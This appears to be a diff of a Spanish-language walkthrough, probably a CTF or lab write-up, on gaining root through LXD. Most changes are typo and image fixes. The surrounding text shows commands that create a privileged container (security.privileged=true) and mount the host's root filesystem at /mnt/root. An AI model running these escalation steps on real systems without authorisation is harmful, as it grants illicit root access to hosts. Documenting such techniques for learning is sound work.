@@ -27,10 +27,10 @@ Y ejecutar el script que creara la imagen:
 	style="float: left; margin-right: 10px;" />
 </p>
 
-Finalmente, ejecutar el script para crear el contenedor y acceder a la ruta ** /mnt/root ** la cual contiene todos los recursos de la máquina anfitrión:
+Finalmente, ejecutar el script para crear el contenedor y acceder a la ruta **/mnt/root** la cual contiene todos los recursos de la máquina anfitrión:
 
 <p align="center">
-	<img src="Images/image3.png"
+	<img src="Images/image4.png"
 		alt="Pwned"
 	style="float: left; margin-right: 10px;" />
 </p>
@@ -44,13 +44,13 @@ lxc image import $file --alias AlpineI && lxd init --auto
 ```
 > LXD es una herramienta que gestiona y administra contenedores en entornos Linux.
 
-Seguidamente, lo que se realiza es la inicialización del nuevo contenedor el cual contiene la flag **security.privileged=true** forzando al contenedor interactuar como root con el sistema de archivos host.
+Seguidamente, lo que se realiza es la inicialización del nuevo contenedor el cual contiene la flag **security.privileged=true** forzando al contenedor a interactuar como root con el sistema de archivos host.
 
 ```bash
 lxc init AlpineI pwned -c security.privileged=true
 ```
 
-Para luego añadir un dispositivo al contenedor para acceder a los recusos de la maquina antifrión.
+Para luego añadir un dispositivo al contenedor el cual permite acceder a los recursos de la máquina anfitrión.
 
 ```bash
 lxc config device add pwned GiveMeRoot disk source=/ path=/mnt/root recursive=true
